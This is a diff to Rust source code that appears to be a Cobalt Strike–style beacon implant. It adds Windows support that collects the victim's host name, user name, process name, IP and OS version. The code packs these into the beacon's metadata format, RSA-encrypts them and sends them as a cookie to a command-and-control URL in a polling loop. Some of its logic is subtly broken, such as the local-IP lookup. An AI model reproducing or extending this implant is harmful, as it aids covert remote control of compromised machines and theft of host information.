@@ -5,7 +5,7 @@ use std::{
     fmt::format,
     fs,
     io::{BufReader, Read},
-    net::{Ipv4Addr, SocketAddr, SocketAddrV4},
+    net::{Ipv4Addr, SocketAddr, SocketAddrV4, IpAddr},
     os::raw,
     process::Command,
     vec,
@@ -72,7 +72,17 @@ impl Beacon {
             hmac_key: hmac_key.try_into().unwrap(),
         }
     }
-    fn collect_info(&self) -> Result<String> {
+
+    fn get_os_type() -> Option<String> {
+        match std::env::consts::OS {
+            "linux" => Some("Linux".into()),
+            "windows" => Some("Windows".into()),
+            "macos" => Some("macOS".into()),
+            _ => None,
+        }
+    }
+    
+    fn linux_collect_info(&self) -> Result<String> {
         let process_id = std::process::id();
         let ssh_port = 0u16;
         let metadata_flag = {
@@ -153,11 +163,108 @@ impl Beacon {
         let pkg = base64::encode_config(enc_pkg, base64::STANDARD);
         Ok(pkg)
     }
+
+    fn windows_collect_info(&self) -> Result<String> {
+        let process_id = std::process::id();
+        let metadata_flag = 0u8;
+        let os_version = win_os_system("ver").unwrap_or("unknow_version".into());
+        let mut os_version_maj: u8 = 0;
+        if let Some(version_str) = os_version.split(".").next() {
+            if let Ok(version_num) = version_str
+                .chars()
+                .filter(|c| c.is_digit(10))
+                .collect::<String>()
+                .parse::<usize>()
+            {
+                os_version_maj = version_num as u8;
+            }
+        }
+        let os_version_min = os_version
+            .split(".")
+            .nth(1)
+            .map(|x| x.parse::<usize>().unwrap())
+            .unwrap() as u8;
+        let os_build: u16 = 0;
+        let ptr_func_addr = 0u32;
+        let ptr_gmh_func_addr = 0u32;
+        let ptr_gpa_func_addr = 0u32;
+        let process_name: String = {
+            let cur_exe = std::env::current_exe().unwrap();
+            let name = cur_exe.file_name().unwrap();
+            name.to_string_lossy().to_string()
+        };
+        let host_name = win_os_system("hostname").unwrap_or("unknow_hostname".into());
+        let user_name = win_os_system("whoami").unwrap_or("unknow_name".into());
+        let local_ip = match Self::get_local_ipv4() {
+            Some(local_ip) => local_ip,
+            None => {
+                eprintln!("Failed to get local IPv4 address");
+                Ipv4Addr::new(127, 0, 0, 1)
+            }
+        };
+        println!("local_ip: {}", local_ip);
+        let os_info = format!("{}\t{}\t{}", &host_name, &user_name, &process_name).into_bytes();
+        let locale_ansi = 936u16;
+        let locale_oem = 936u16;
+        let online_info = [
+            &self.id.to_be_bytes()[..],
+            &process_id.to_be_bytes()[..],
+            &metadata_flag.to_be_bytes()[..],
+            &os_version_maj.to_be_bytes()[..],
+            &os_version_min.to_be_bytes()[..],
+            &os_build.to_be_bytes()[..],
+            &ptr_func_addr.to_be_bytes()[..],
+            &ptr_gmh_func_addr.to_be_bytes()[..],
+            &ptr_gpa_func_addr.to_be_bytes()[..],
+            &u32::from(local_ip).to_be_bytes()[..],
+            &os_info,
+        ]
+        .concat();
+        let meta_info = [
+            &self.base_key,
+            &locale_ansi.to_be_bytes()[..],
+            &locale_oem.to_be_bytes()[..],
+            &online_info,
+        ]
+        .concat();
+        let magic = 0xbeefu32;
+        let raw_pkg = [
+            &magic.to_be_bytes()[..],
+            &(meta_info.len() as u32).to_be_bytes()[..],
+            meta_info.as_slice(),
+        ]
+        .concat();
+        let public_key = RsaPublicKey::from_public_key_pem(PUB_KEY).expect("wrong PEM format");
+        let padding = PaddingScheme::new_pkcs1v15_encrypt();
+        let mut rng = rand::thread_rng();
+        let enc_pkg = public_key.encrypt(&mut rng, padding, &raw_pkg[..])?;
+        let pkg = base64::encode_config(enc_pkg, base64::STANDARD);
+        Ok(pkg)
+    }
+
+    fn get_local_ipv4() -> Option<Ipv4Addr> {
+        let socket = SocketAddr::from(([0, 0, 0, 0], 0));
+        match socket.ip() {
+            IpAddr::V4(ipv4) => Some(ipv4),
+            IpAddr::V6(_) => {
+                eprintln!("Only IPv4 addresses are supported");
+                None
+            }
+        }
+    }
 }
 
 fn main() {
     let beacon = Beacon::init();
-    let cookie = beacon.collect_info().expect("collect info error");
+
+    let cookie = match Beacon::get_os_type().as_deref() {
+        Some("Linux") => beacon.linux_collect_info(),
+        Some("Windows") => beacon.windows_collect_info(),
+        Some("macOS") => beacon.linux_collect_info(),
+        _ => beacon.linux_collect_info(),
+    }
+    .unwrap_or_else(|_| panic!("collect info error"));
+
     println!("starting connect to {}", C2_GET_URL);
     loop {
         let http_res = Strike::http_get(C2_GET_URL, &cookie, USER_AGENT);
